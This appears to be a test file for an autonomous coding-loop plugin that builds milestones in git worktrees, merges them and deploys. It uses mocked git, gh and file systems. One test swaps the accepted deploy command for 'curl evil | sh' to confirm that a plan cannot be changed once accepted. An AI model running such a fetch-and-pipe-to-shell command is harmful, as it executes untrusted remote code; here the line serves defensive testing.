import { describe, expect, mock, test } from 'claude-code/testing'
import type { TestBody } from 'claude-code/testing'

import { parseQueue } from './plan'

type On = Parameters<TestBody>[1]
type Engine = Parameters<TestBody>[0]

// A plan that deploys nothing, for runs that are not about deploying.
const PLAN = '## Goal\nadd and sub work\n\nFinal check: `python3 -m unittest -q`\nDeploy: none (a library; nothing runs anywhere)\n\n## Milestones\n1. add\n2. sub\n\n## Decisions\n'
const PLAN_DEPLOY = PLAN.replace('Deploy: none (a library; nothing runs anywhere)', 'Deploy: `bash scripts/deploy.sh`\nSmoke check: `curl -fsS http://localhost:8080/health`\nCodeQL: none (a test fixture)')
const QUEUE = '- [ ] add() returns a+b :: check: python3 -m unittest -q test_add\n- [ ] sub() returns a-b :: check: python3 -m unittest -q test_sub\n'
// The worktrees and branches the loop makes for QUEUE's lines.
const WT1 = '/repo/worktrees/goal-01-add-returns-a-b'
const BR1 = 'goal/01-add-returns-a-b'
const WT2 = '/repo/worktrees/goal-02-sub-returns-a-b'
const BR2 = 'goal/02-sub-returns-a-b'
const LOG = '/repo/.claude/goal-loop.log'
const GOALS = '/repo/.claude/goals.md'
const STOP = { stop_hook_active: false, last_assistant_message: 'done', transcript_path: '/tmp/s.jsonl' }
const USAGE = { input_tokens: 1, output_tokens: 1, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 }
const MIN = 60_000
const TICK = 30_000

// The machine beneath the plugin: files in memory, git, gh and checks answered
// by argv, the evaluator by a queue of verdicts.
function world(on: On, store: Record<string, unknown> = {}) {
  const w = {
    files: new Map<string, string>([['/repo/.git/info/exclude', ''], ['/tmp/s.jsonl', '']]),
    prompts: [] as string[],
    commands: [] as string[],
    // Commands the engine has (/goal where it exists).
    commandNames: [] as string[],
    runs: [] as string[],
    notifies: [] as string[],
    pushes: [] as string[],
    // Every `git worktree add` (not --detach): the loop's milestone worktrees and remade ones.
    adds: [] as string[],
    checkExit: 0,
    dirty: '',
    verdicts: [] as string[],
    evaluations: 0,
    // The session's directory (its primary working directory).
    cwd: '/repo',
    // What `gh pr checks` reports (all checks), and with --required (undefined: none are required).
    checks: '[{"bucket":"pass"}]',
    required: undefined as string | undefined,
    ciLooks: 0,
    merged: [] as string[],
    // `gh pr merge` answers an error (a lost reply), and what `gh pr view` says of the PR.
    mergeFails: false,
    prState: 'OPEN',
    // `gh run list` for a PR's branch.
    runList: '[]',
    // Worktree directories removed from under the run, and whether their branches went too.
    gone: new Set<string>(),
    branchGone: false,
    // The check's exit in a fresh checkout, when it differs from the builder's worktree.
    freshExit: undefined as number | undefined,
    // GitHub CI mode, a branch push whose git cannot be spawned, an SSH push refused.
    github: false,
    gitGone: false,
    sshDenied: false,
    repo: true,
    origin: true,
    originHead: 'origin/main',
    remoteHead: 'main',
    // `git for-each-ref refs/heads/goal/`.
    branches: '',
    unwritable: new Set<string>(),
    // The deploy command's and the smoke check's exits, and the deploy scripts not on main yet.
    deployExit: 0,
    smokeExit: 0,
    missing: new Set<string>(),
    // Every `git rebase`, and whether a stacked branch's rebase --onto conflicts.
    rebases: [] as string[],
    rebaseFails: false,
    clock: mock.clock(on, { now: 1_000 }),
  }
  const removed = (path: string) => [...w.gone].some(g => path === g || path.startsWith(`${g}/`))
  const exists = (path: string) => w.files.has(path) || (!path.includes('/.claude/') && !removed(path))
  mock.store(on, store)
  on('tool.register', (_, e) => ({ value: { tool: `mcp__auto-claude__${e.name}` } }))
  on('command.register', (_, e) => ({ value: { command: e.name } }))
  on('command.list', () => ({ value: w.commandNames.map(name => ({ name })) as never }))
  on('session.start', (_, e) => ({ cwd: e.cwd }))
  on('session.id', () => ({ value: 'me' }))
  on('session.cwd', () => ({ value: w.cwd }))
  on('prompt.compose', () => ({ sections: [] }))
  on('classic.Stop', () => ({}))
  on('turn.start', (_, e) => ({ turnId: e.turnId }) as never)
  on('turn.complete', (_, e) => ({ text: e.answer }) as never)
  on('tool.call', () => ({ result: 'ran' }))
  on('ui.toast', () => ({ value: undefined }))
  on('ui.log', () => ({ value: undefined }))
  on('ui.notify', (_, e) => {
    w.notifies.push(e.text)
    return { value: { isSent: true as const, channel: 'terminal_bell' as const } }
  })
  on('env.get', () => ({ value: '/home' }))
  on('fs.read', (_, e) => {
    const t = w.files.get(e.path)
    return t === undefined ? { deny: `ENOENT ${e.path}` } : { value: t }
  })
  on('fs.exists', (_, e) => ({ value: exists(e.path) }))
  on('fs.write', (_, e) => {
    if (w.unwritable.has(e.path)) return { deny: `EACCES ${e.path}` }
    w.files.set(e.path, e.text)
    return { value: undefined }
  })
  on('prompt.submit', (_, e) => {
    w.prompts.push(e.text)
    return { text: e.text }
  })
  on('command.run', (_, e) => {
    w.commands.push(`${e.command} ${e.args ?? ''}`.trim())
    return { text: 'ok' }
  })
  on('model.complete', () => {
    w.evaluations++
    const text = w.verdicts.shift() ?? '{"met": false, "reason": "x"}'
    if (text === 'throw') throw new Error('blocked model')
    return { value: { isAnswered: true as const, text, usage: USAGE } }
  })
  on('process.run', (_, e) => {
    const a = e.argv.join(' ')
    w.runs.push(a)
    const ok = (stdout = '', exitCode = 0, stderr = '') => ({ value: { exitCode, stdout, stderr, isStdoutTruncated: false, isStderrTruncated: false } })
    const cwd = String(e.init?.cwd ?? '')
    // git cannot start in a directory that is gone (Bun: posix_spawn ENOENT).
    if (cwd !== '' && removed(cwd)) return ok('', -1)
    if (a.includes('--git-common-dir')) return w.repo ? ok('/repo/.git\n') : ok('', 128)
    if (a.includes(' init')) {
      w.repo = true
      return ok()
    }
    if (a.includes('for-each-ref')) return ok(w.branches)
    if (a.includes('symbolic-ref --short HEAD')) return ok('main\n')
    if (e.argv[0] === 'mv') {
      const [from, to] = e.argv.slice(-2) as [string, string]
      const text = w.files.get(from)
      if (text === undefined) return ok('', 1)
      w.files.set(to, text)
      w.files.delete(from)
      return ok()
    }
    if (a.endsWith(' remote')) return ok(w.origin ? 'origin\n' : '')
    if (a.includes(' remote get-url ')) return ok('git@github.com:o/r.git\n')
    if (a.includes('symbolic-ref')) return w.originHead === '' ? ok('', 128) : ok(`${w.originHead}\n`)
    if (a.includes('ls-remote --symref')) return ok(`ref: refs/heads/${w.remoteHead}\tHEAD\nabc123\tHEAD\n`)
    if (a.startsWith('gh repo view')) return ok('', w.github ? 0 : 1)
    if (a.startsWith('gh pr create')) return ok('https://github.com/o/r/pull/7\n')
    if (a.startsWith('gh pr checks')) {
      if (a.includes('--required')) {
        if (w.required === undefined) return ok('', 1, "no required checks reported on the 'x' branch")
        w.ciLooks++
        return ok(w.required)
      }
      w.ciLooks++
      return ok(w.checks)
    }
    if (a.startsWith('gh pr view')) return ok(`{"state":"${w.prState}","mergeable":"MERGEABLE"}`)
    if (a.startsWith('gh pr merge')) {
      w.merged.push(a)
      if (w.mergeFails) {
        w.prState = 'MERGED'
        return ok('', 1, 'HTTP 502: Bad Gateway')
      }
      return ok()
    }
    if (a.startsWith('gh pr reopen')) {
      w.prState = 'OPEN'
      return ok()
    }
    if (a.startsWith('gh run list')) return ok(w.runList)
    if (e.argv[0] === 'test' && e.argv[1] === '-d') return ok('', w.gone.has(String(e.argv[2])) ? 1 : 0)
    if (e.argv[0] === 'test' && e.argv[1] === '-e') return ok('', w.missing.has(String(e.argv[2])) ? 1 : 0)
    if (a.includes('rev-parse --verify')) return w.branchGone ? ok('', 1) : ok(`tip-of-${String(e.argv.at(-1)).replace(/\^\{commit\}$/, '')}\n`)
    if (a.includes(' rebase ')) w.rebases.push(a)
    if (a.includes(' rebase --onto') && w.rebaseFails) return ok('', 1, 'CONFLICT (content): Merge conflict in calc.py')
    if (a.includes('worktree add') && !a.includes('--detach')) {
      w.adds.push(a)
      w.gone.delete(String(e.argv[5]))
    }
    if (e.argv[0] === 'bash' && cwd.endsWith('/worktrees/auto-deploy')) return ok('', String(e.argv[2]).startsWith('curl') ? w.smokeExit : w.deployExit)
    if (e.argv[0] === 'bash') return ok('', cwd.endsWith('/worktrees/auto-verify') && w.freshExit !== undefined ? w.freshExit : w.checkExit)
    if (a.includes('status --porcelain') && !a.includes('--untracked-files')) return ok(w.dirty)
    if (w.gitGone && a.includes(' push -u ')) return ok('', -1, "posix_spawn 'git' ENOENT")
    if (w.sshDenied && a.includes(' push -u origin ')) return ok('', 128, 'git@github.com: Permission denied (publickey).\nfatal: Could not read from remote repository.')
    if (a.includes(' push ')) {
      w.pushes.push(a)
      return ok()
    }
    return ok()
  })
  return w
}

type W = ReturnType<typeof world>

const cmd = ($: Engine, args: string) => $.command.run({ command: 'auto-claude', args, origin: { kind: 'composer' }, presentation: { isFullscreen: false, columns: 80 } })
const ready = ($: Engine) => $.tool.call({ tool: 'mcp__auto-claude__auto_plan_ready' } as never)
const compose = ($: Engine) => $.prompt.compose({ sections: [], text: '', model: 'claude-opus-5-5', promptModel: 'claude-opus-5-5', surfaces: [], tools: [], outputStyle: null, traits: [] } as never)
const turnStart = ($: Engine) => $.turn.start({ text: '', turnId: 't' } as never)
const turnEnd = ($: Engine) => $.turn.complete({ answer: 'waiting', reason: 'answer', turnId: 't', durationMs: 1, isAborted: false } as never)

// Starts a run, plans it and lets the first milestone start (its worktree and kickoff).
async function planned($: Engine, w: W, plan = PLAN) {
  await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
  await cmd($, 'start')
  w.files.set('/repo/.claude/auto-plan.md', plan)
  w.files.set(GOALS, QUEUE)
  await ready($)
  await w.clock.advance(1_200)
}

// The model finishes the milestone it is building: the check passes, the judge
// says met. `then` sets up what shipping meets, before the driver looks.
async function meet($: Engine, w: W, then?: () => void) {
  w.verdicts.push('{"met": true, "reason": "tests pass"}')
  const stop = await $.classic.Stop(STOP)
  then?.()
  await w.clock.advance(1_200)
  return stop
}

const deployRuns = (w: W) => w.runs.filter(r => r.startsWith('bash -lc ') && (r.includes('deploy.sh') || r.includes('curl')))

describe('a run, local CI', () => {
  test('plan → the loop builds each milestone → merged into main one at a time → final check → done', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start add and sub')).text).toContain('local CI, merges into main, deploys as the plan says')
    await w.clock.advance(200)
    expect(w.prompts[0]).toContain('Their aim: add and sub')
    // No files to steer a loop in another plugin any more.
    expect(w.files.has('/repo/.claude/goal-loop.base')).toBe(false)
    expect(w.files.has('/repo/.claude/goal-loop.gate')).toBe(false)
    expect(w.files.get('/repo/.claude/goal-loop.deny')).toContain('gh\\s+pr\\s+merge')
    expect(w.files.get('/repo/.git/info/exclude')).toContain('.claude/goals.md')

    expect(String((await ready($)).result)).toContain('Not ready')
    w.files.set('/repo/.claude/auto-plan.md', PLAN)
    w.files.set(GOALS, QUEUE)
    const accepted = String((await ready($)).result)
    expect(accepted).toContain('Plan accepted: 2 milestone(s)')
    expect(accepted).toContain('deploys nothing (a library; nothing runs anywhere)')
    // The driver starts the first milestone itself: its worktree from origin/main, then its kickoff.
    await w.clock.advance(1_200)
    expect(w.adds).toEqual([`git -C /repo worktree add ${WT1} -b ${BR1} origin/main`])
    expect(w.prompts.at(-1)).toContain('[auto-claude loop] Milestone #1: add() returns a+b')
    expect(w.commands.filter(c => c.startsWith('goal-mode'))).toEqual([])

    // Met: checked, judged, merged into main, the worktree removed and the next one started.
    expect((await meet($, w)).block).toBeUndefined()
    expect(w.files.get(GOALS)).toMatch(/- \[x\] add\(\) returns a\+b/)
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes('HEAD:main') && p.includes(WT1))).toBe(true)
    expect(w.runs).toContain(`git -C /repo worktree remove ${WT1}`)
    expect(w.adds.at(-1)).toBe(`git -C /repo worktree add ${WT2} -b ${BR2} origin/main`)

    // Milestone 2, then the queue is done: the final check runs on merged main.
    await meet($, w)
    for (let i = 0; i < 3; i++) await w.clock.advance(TICK)
    expect(w.runs.some(r => r.includes('worktree add --detach /repo/worktrees/auto-final origin/main'))).toBe(true)
    expect(w.files.get('/repo/.claude/auto-plan.md')).toContain('Nothing deployed: a library; nothing runs anywhere.')
    expect(w.notifies.at(-1)).toContain('finished: the final check passed after 1 round(s). 2 merged, 0 held')
    expect((await cmd($, 'status')).text).toContain('auto-claude off · phase done')
  })

  test('a loop log at its 2000-line cap still yields every new event', async ($, on) => {
    const w = world(on)
    w.files.set(LOG, `${Array.from({ length: 2000 }, (_, i) => JSON.stringify({ ts: `t${i}`, event: 'denied' })).join('\n')}\n`)
    await planned($, w)
    await meet($, w)
    await w.clock.advance(TICK)
    await meet($, w)
    await w.clock.advance(TICK)
    expect((w.files.get(LOG) ?? '').trim().split('\n')).toHaveLength(2000)
    // Each milestone landed once: no event was read twice.
    expect(w.pushes.filter(p => p.includes('HEAD:main'))).toHaveLength(2)
    expect((await cmd($, 'status')).text).toContain('2 merged, 0 held')
  })

  test('an origin with no origin/HEAD takes the remote\'s own default branch, not main', async ($, on) => {
    const w = world(on)
    w.originHead = ''
    w.remoteHead = 'master'
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start')).text).toContain('merges into master')
    w.files.set('/repo/.claude/auto-plan.md', PLAN)
    w.files.set(GOALS, QUEUE)
    await ready($)
    await w.clock.advance(1_200)
    expect(w.adds[0]).toBe(`git -C /repo worktree add ${WT1} -b ${BR1} origin/master`)
  })

  test('a tick that fails every time is told to the person once, with its error, and again only after it recovered', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await planned($, w)
    // The fresh checkout fails, and the fix line cannot be written.
    await meet($, w, () => {
      w.freshExit = 1
      w.unwritable.add(GOALS)
    })
    for (let i = 0; i < 8; i++) await w.clock.advance(TICK)
    const told = w.notifies.filter(n => n.includes('tick fails'))
    expect(told).toHaveLength(1)
    expect(told[0]).toContain('EACCES')
    expect((await cmd($, 'status')).text).toContain('stalled: every tick fails')
    w.unwritable.delete(GOALS)
    await w.clock.advance(TICK)
    expect((await cmd($, 'status')).text).not.toContain('every tick fails')
  })

  test('the time cap is counted on the engine\'s clock: 24 h after the start the run stops', { timeoutMs: 30_000 }, async ($, on) => {
    const run = (startedAt: number) => ({ on: true, phase: 'run', root: '/repo', sessionId: 'me', hint: '', round: 1, startedAt, remote: 'origin', defaultBranch: 'main', ciMode: 'local', logOffset: 0, started: 0, finished: 0, worktrees: {}, ships: [], fixes: {}, merges: 0, held: 0, queueEmpty: false })
    const w = world(on, { 'auto:/repo': run(1_000 - 23 * 60 * MIN), 'loop:/repo': { repoRoot: '/repo', seq: 0, retries: 0 } })
    w.files.set(GOALS, QUEUE)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    // The session works on its milestone the whole time.
    await turnStart($)
    await w.clock.advance(TICK)
    expect(w.notifies.some(n => n.includes('time cap'))).toBe(false)
    await w.clock.advance(60 * MIN)
    expect(w.notifies.some(n => n.includes('stopped: the time cap (24 h) was reached'))).toBe(true)
  })

  test('a loop log cleared by hand is read from its start once it stays short for a second tick', async ($, on) => {
    const w = world(on)
    w.files.set(LOG, `${Array.from({ length: 40 }, (_, i) => JSON.stringify({ ts: `t${i}`, event: 'denied' })).join('\n')}\n`)
    await planned($, w)
    await w.clock.advance(TICK)
    w.files.set(LOG, '')
    await meet($, w)
    expect(w.pushes.some(p => p.includes(WT1))).toBe(false)
    await w.clock.advance(TICK)
    expect(w.pushes.filter(p => p.includes('HEAD:main') && p.includes(WT1))).toHaveLength(1)
  })

  test('nothing more starts while the loop is still building a milestone', async ($, on) => {
    const w = world(on)
    await planned($, w)
    await turnStart($)
    for (let i = 0; i < 5; i++) await w.clock.advance(TICK)
    expect(w.adds).toHaveLength(1)
    expect((await cmd($, 'status')).text).toContain(`building: add() returns a+b (${BR1})`)
  })

  test('a check that fails in a fresh checkout adds a fix goal on the milestone branch, which the loop builds next and lands', async ($, on) => {
    const w = world(on)
    await planned($, w)
    await meet($, w, () => {
      w.freshExit = 1
    })
    expect(w.runs.some(r => r.includes('worktree add --detach /repo/worktrees/auto-verify'))).toBe(true)
    expect(w.pushes.some(p => p.includes('HEAD:main'))).toBe(false)
    const fix = parseQueue(w.files.get(GOALS) ?? '').find(i => i.base !== undefined)
    expect(fix?.base).toBe(BR1)
    expect(fix?.condition).toContain('fresh checkout')
    expect((await cmd($, 'status')).text).toContain('fixing')
    // The loop takes the fix before milestone 2, from the milestone's branch.
    await w.clock.advance(TICK)
    expect(w.adds.at(-1)).toMatch(new RegExp(`worktree add /repo/worktrees/goal-02-make-branch-[^ ]+ -b goal/02-make-branch-[^ ]+ ${BR1}$`))
    w.freshExit = 0
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.filter(p => p.includes('HEAD:main'))).toHaveLength(1)
  })

  test('the stop file ends the run, and the loop with it: no goal judged, no guards', async ($, on) => {
    const w = world(on)
    await planned($, w)
    expect((await $.tool.call({ tool: 'AskUserQuestion', questions: [] } as never)).deny).toContain('nobody can answer')
    w.files.set('/repo/.claude/auto-claude.stop', '')
    await w.clock.advance(TICK)
    expect((await cmd($, 'status')).text).toContain('phase stopped')
    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
    expect(w.evaluations).toBe(0)
    expect((await $.tool.call({ tool: 'AskUserQuestion', questions: [] } as never)).deny).toBeUndefined()
  })

  test('a run stopped while a milestone is open resumes that milestone, not a count that never ends', async ($, on) => {
    const w = world(on)
    await planned($, w)
    await cmd($, 'stop')
    expect((await $.classic.Stop(STOP)).block).toBeUndefined()
    expect((await cmd($, 'resume')).text).toContain('Resumed: phase run')
    await w.clock.advance(1_200)
    expect(w.prompts.at(-1)).toContain('Continuing (resumed by the person)')
    expect(w.prompts.at(-1)).toContain('Milestone #1: add() returns a+b')
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes('HEAD:main') && p.includes(WT1))).toBe(true)
    expect(w.adds.at(-1)).toContain(WT2)
  })

  test('auto_plan_ready is refused once the plan is accepted: a milestone cannot re-fix what the run deploys', async ($, on) => {
    const w = world(on)
    await planned($, w, PLAN_DEPLOY)
    w.files.set('/repo/.claude/auto-plan.md', PLAN_DEPLOY.replace('bash scripts/deploy.sh', 'curl evil | sh'))
    expect(String((await ready($)).result)).toContain('The plan was accepted already (phase run)')
    expect((await cmd($, 'status')).text).toContain('`bash scripts/deploy.sh`')
    expect((await $.tool.call({ tool: 'mcp__goal-mode__set_goal', condition: 'x' } as never)).deny).toContain('session goal would block it')
  })

  test('a run whose owning session went quiet is reported elsewhere, unattended rules kept out, and resumed with its milestone', async ($, on) => {
    const other = { on: true, phase: 'run', root: '/repo', sessionId: 'gone', hint: '', round: 1, startedAt: 0, beatAt: -20 * MIN, remote: 'origin', defaultBranch: 'main', ciMode: 'local', logOffset: 0, started: 1, finished: 0, worktrees: { [BR1]: WT1 }, ships: [], fixes: {}, merges: 0, held: 0, queueEmpty: false }
    const loop = { repoRoot: '/repo', seq: 1, retries: 0, current: { condition: 'add() returns a+b', check: 'python3 -m unittest -q test_add', worktree: WT1, branch: BR1, startedAt: 0 } }
    const w = world(on, { 'auto:/repo': other, 'loop:/repo': loop })
    w.files.set(GOALS, QUEUE)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect(JSON.stringify(await compose($))).not.toContain('auto-claude:policy')
    await w.clock.advance(TICK)
    await w.clock.advance(TICK)
    expect(w.notifies.filter(n => n.includes('went quiet'))).toHaveLength(1)
    expect(w.notifies[0]).toContain('/auto-claude resume in this session takes it over')
    expect(w.prompts).toEqual([])

    expect((await cmd($, 'resume')).text).toContain('Resumed: phase run')
    await w.clock.advance(1_200)
    expect(w.prompts.at(-1)).toContain('Continuing (resumed by the person)')
    expect(w.prompts.at(-1)).toContain('Milestone #1: add() returns a+b')
    const composed = JSON.stringify(await compose($))
    expect(composed).toContain('auto-claude:policy')
    expect(composed).toContain('auto-claude:loop')
    // Its milestone is judged here now.
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes('HEAD:main'))).toBe(true)
  })

  test('a run still planning is reminded with what the files lack, then stopped', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await cmd($, 'start')
    await w.clock.advance(200)
    expect(w.prompts).toHaveLength(1)
    await w.clock.advance(16 * MIN)
    expect(w.prompts[1]).toContain('Reminder 1/3')
    expect(w.prompts[1]).toContain('auto-plan.md is missing')
    for (let i = 0; i < 3; i++) await w.clock.advance(16 * MIN)
    expect(w.prompts.filter(p => p.includes('Reminder'))).toHaveLength(3)
    expect((await cmd($, 'status')).text).toContain('no plan was accepted after 3 reminders')
  })

  test('a planning turn that ends without a plan is reminded 1 min later, not 15 (P4)', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await cmd($, 'start')
    await w.clock.advance(200)
    await turnStart($)
    await w.clock.advance(MIN)
    // The model ends its turn asking the person something.
    await turnEnd($)
    await w.clock.advance(MIN)
    expect(w.prompts.filter(p => p.includes('Reminder'))).toHaveLength(0)
    await w.clock.advance(MIN + TICK)
    expect(w.prompts.filter(p => p.includes('Reminder'))).toHaveLength(1)
  })

  test('a milestone whose worktree was removed is made again from its branch, or held when the branch is gone too', async ($, on) => {
    const w = world(on)
    await planned($, w)
    await meet($, w, () => w.gone.add(WT1))
    expect(w.runs).toContain(`git -C /repo worktree add ${WT1} ${BR1}`)
    expect(w.pushes.some(p => p.includes('HEAD:main'))).toBe(true)

    // The next one loses its branch as well: held and told, and the run goes on.
    await meet($, w, () => {
      w.gone.add(WT2)
      w.branchGone = true
    })
    expect(w.notifies.some(n => n.includes('held') && n.includes(`branch ${BR2} are gone`) && n.includes('going on'))).toBe(true)
  })

  test('a run started over a stale stop file keeps running, and resume sets one aside too', async ($, on) => {
    const w = world(on)
    w.files.set('/repo/.claude/auto-claude.stop', '')
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect((await cmd($, 'start')).text).toContain('moved to .claude/auto-claude.stop.cleared')
    expect(w.files.has('/repo/.claude/auto-claude.stop')).toBe(false)
    expect(w.files.get('/repo/.git/info/exclude')).toContain('.claude/auto-claude.stop.cleared')
    for (let i = 0; i < 3; i++) await w.clock.advance(TICK)
    expect((await cmd($, 'status')).text).toContain('auto-claude on · phase plan')
    w.files.set('/repo/.claude/auto-claude.stop', '')
    await w.clock.advance(TICK)
    expect((await cmd($, 'status')).text).toContain('phase stopped')
    expect((await cmd($, 'resume')).text).toContain('moved to .claude/auto-claude.stop.cleared')
    for (let i = 0; i < 3; i++) await w.clock.advance(TICK)
    expect((await cmd($, 'status')).text).toContain('auto-claude on')
  })

  test('status names an orphaned owner and how long ago it last ticked', async ($, on) => {
    const other = { on: true, phase: 'run', root: '/repo', sessionId: 'gone-session', hint: '', round: 1, startedAt: 0, beatAt: 1_000 - 25 * MIN, remote: 'origin', defaultBranch: 'main', ciMode: 'local', logOffset: 0, started: 1, finished: 1, worktrees: {}, ships: [], fixes: {}, merges: 1, held: 0, queueEmpty: false }
    world(on, { 'auto:/repo': other })
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    const text = (await cmd($, 'status')).text ?? ''
    expect(text).toContain('stalled: orphaned')
    expect(text).toContain('gone-ses')
    expect(text).toContain('25 min ago')
  })

  test('status names planning still waiting and what the plan files lack', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await cmd($, 'start')
    await w.clock.advance(200)
    expect((await cmd($, 'status')).text).not.toContain('stalled:')
    w.files.set('/repo/.claude/auto-plan.md', PLAN.replace(/Deploy:.*\n/, ''))
    await w.clock.advance(16 * MIN)
    const text = (await cmd($, 'status')).text ?? ''
    expect(text).toContain('stalled: planning still waiting')
    expect(text).toContain('goals.md is missing')
    expect(text).toContain('no "Deploy:')
  })

  test('start from a session whose directory was a removed worktree finds the repository above it', async ($, on) => {
    const w = world(on)
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    w.cwd = '/repo/worktrees/goal-03-landed'
    w.gone.add('/repo/worktrees/goal-03-landed')
    const text = (await cmd($, 'start')).text ?? ''
    expect(text).toContain('auto-claude on in /repo')
    expect(text).toContain('/repo/worktrees/goal-03-landed no longer exists')
  })

  test('session.start draws the piece even with no run; session.end clears it by the ending id', async ($, on) => {
    const w = world(on)
    on('session.end', (_, e) => ({ sessionId: e.sessionId }))
    const PIECE = '/home/.claude/statusline/me/auto-claude.txt'
    w.files.set(PIECE, 'auto·R1·M2/7')
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    expect(w.files.get(PIECE)).toBe('')
    await cmd($, 'start')
    expect(w.files.get(PIECE)).toContain('auto·R1·plan')
    await $.session.end({ reason: 'clear', sessionId: 'me', resume: { id: 'me' } })
    expect(w.files.get(PIECE)).toBe('')
  })

  test('a run from goal-mode\'s loop takes its open milestone over from the log; seq starts above the branches there are', async ($, on) => {
    const rec = { on: true, phase: 'run', root: '/repo', sessionId: 'me', hint: '', round: 1, startedAt: 0, remote: 'origin', defaultBranch: 'main', ciMode: 'local', logOffset: 1, started: 1, finished: 0, credit: true, worktrees: { 'goal/07-add': '/repo/worktrees/goal-07-add' }, ships: [], fixes: {}, merges: 0, held: 0, queueEmpty: false }
    const w = world(on, { 'auto:/repo': rec })
    w.files.set(GOALS, QUEUE)
    w.files.set(LOG, `${JSON.stringify({ ts: 'a', event: 'start', goal: 'add() returns a+b', worktree: '/repo/worktrees/goal-07-add', branch: 'goal/07-add' })}\n`)
    w.branches = 'goal/07-add\n'
    await $.session.start({ cwd: '/repo', surface: 'terminal', isInteractive: true })
    await w.clock.advance(1_200)
    expect(w.prompts.at(-1)).toContain('auto-claude 1.0 took the loop over from goal-mode')
    expect(w.prompts.at(-1)).toContain('/repo/worktrees/goal-07-add')
    // Met here: it ships, and the next milestone takes a seq above goal/07.
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes('HEAD:main'))).toBe(true)
    expect(w.adds.at(-1)).toContain('-b goal/08-sub-returns-a-b')
  })
})

describe('a run, github CI', () => {
  test('a met milestone with green CI reaches its successor\'s start in one tick; a pending CI is looked at every 10 s', async ($, on) => {
    const w = world(on)
    w.github = true
    await planned($, w)
    await meet($, w)
    expect(w.merged).toHaveLength(1)
    expect(w.adds).toHaveLength(2)
    for (const call of w.runs.filter(a => /^gh pr (create|checks|view|merge)/.test(a))) expect(call).toContain('--repo o/r')

    w.checks = '[{"bucket":"pending"}]'
    await meet($, w)
    expect(w.merged).toHaveLength(1)
    const looks = w.ciLooks
    w.checks = '[{"bucket":"pass"}]'
    await w.clock.advance(10_000)
    expect(w.ciLooks).toBe(looks + 1)
    expect(w.merged).toHaveLength(2)
  })

  test('the session keeps building while a PR waits on CI: the next milestone is stacked on its branch, then rebased off it and shipped once it lands', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pending"}]'
    await planned($, w)
    await meet($, w)
    expect(w.merged).toHaveLength(0)
    // Milestone 2 started at once, on milestone 1's branch, with the commit it builds on kept.
    expect(w.adds.at(-1)).toBe(`git -C /repo worktree add ${WT2} -b ${BR2} ${BR1}`)
    expect(w.prompts.at(-1)).toContain('Milestone #2')
    // Met while milestone 1 still waits: it waits its turn, unpushed.
    await meet($, w)
    await w.clock.advance(TICK)
    expect(w.pushes.some(p => p.includes(BR2))).toBe(false)
    expect((await cmd($, 'status')).text).toContain('- stacked: sub() returns a-b')
    // Milestone 1 lands; milestone 2 drops its commits, then is pushed and landed the same way.
    w.checks = '[{"bucket":"pass"}]'
    await w.clock.advance(10_000)
    expect(w.merged).toHaveLength(2)
    expect(w.rebases).toContain(`git -C ${WT2} rebase --onto origin/main tip-of-${BR1}`)
    // Rebased after the session may have pushed it: pushed with a lease.
    expect(w.pushes.find(p => p.includes(`${BR2}:${BR2}`))).toContain('--force-with-lease')
    for (let i = 0; i < 3; i++) await w.clock.advance(TICK)
    expect(w.notifies.at(-1)).toContain('finished: the final check passed after 1 round(s). 2 merged, 0 held')
  })

  test('a stacked milestone that does not rebase once its parent lands gets a fix goal that rebases it by hand', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pending"}]'
    await planned($, w)
    await meet($, w)
    await meet($, w)
    w.rebaseFails = true
    w.checks = '[{"bucket":"pass"}]'
    await w.clock.advance(TICK)
    expect(w.merged).toHaveLength(1)
    expect(w.runs).toContain(`git -C ${WT2} rebase --abort`)
    const fix = parseQueue(w.files.get(GOALS) ?? '').find(i => i.base !== undefined)
    expect(fix?.base).toBe(BR2)
    expect(fix?.condition).toContain(`git rebase --onto origin/main tip-of-${BR1}`)
    // The fix goal is built next, on milestone 2's branch.
    expect(w.adds.at(-1)).toContain(`-b goal/03-`)
    expect(w.adds.at(-1)).toMatch(new RegExp(`${BR2}$`))
  })

  test('a broken deploy is repaired before a stacked milestone merges on top of it', { timeoutMs: 30_000 }, async ($, on) => {
    const w = world(on)
    w.github = true
    w.checks = '[{"bucket":"pending"}]'
    await planned($, w, PLAN_DEPLOY)
    await meet($, w)
    // Milestone 2 is built and stacked while milestone 1 waits on CI.
    await meet($, w)
    w.deployExit = 1
    w.checks = '[{"bucket":"pass"}]'
    await w.clock.advance(10_000)
    // Milestone 1 landed, its deploy failed: milestone 2 stays stacked, the repair is built from main.
    expect(w.merged).toHaveLength(1)
    expect(deployRuns(w).filter(r => r.includes('deploy.sh'))).toHaveLength(1)
    expect((await cmd($, 'status')).text).toContain('- stacked: sub() returns a-b')
    expect(w.adds.at(-1)).toMatch(/origin\/main$/)
